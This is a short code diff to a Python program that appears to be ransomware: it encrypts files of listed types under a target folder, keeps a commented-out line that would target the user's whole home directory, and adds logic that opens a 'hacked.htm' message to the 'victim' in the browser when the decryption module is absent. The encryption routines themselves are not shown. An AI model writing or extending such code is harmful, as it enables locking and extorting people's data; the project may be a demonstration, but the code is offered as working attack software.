@@ -20,20 +20,27 @@ def main(argv):
     else:
         mode = getOption(argv)
 
-    # Only imports module relevant to the mode
-    # This means encrypt and decrypt can be separated
+    # File to display message to victim
+    message_to_victim = "hacked.htm"
+
+    '''
+    Only imports module relevant to the mode. This means encrypt and decrypt 
+    can be separated. If the decrypt module is missing, the program opens the 
+    browser and displays the message
+    '''
     if mode == 'encrypt':
         from product_cipher_encrypt import encrypt
     elif mode == 'decrypt':
-        from product_cipher_decrypt import decrypt
+        try:
+            from product_cipher_decrypt import decrypt
+        except ImportError:
+            webbrowser.open(message_to_victim, new=1)
+            sys.exit(2)
 
     # Specify the root directory
     path = "target_folder/"
     # This version selects the user's home directory for the root
     # path = expanduser("~")
-
-    # File to display message to victim
-    message_to_victim = "hacked.htm"
 
     # List of the filetypes that are supported by the program
     ext = ('.txt', '.xhtml', '.html', '.htm', '.css', '.php', '.sql',
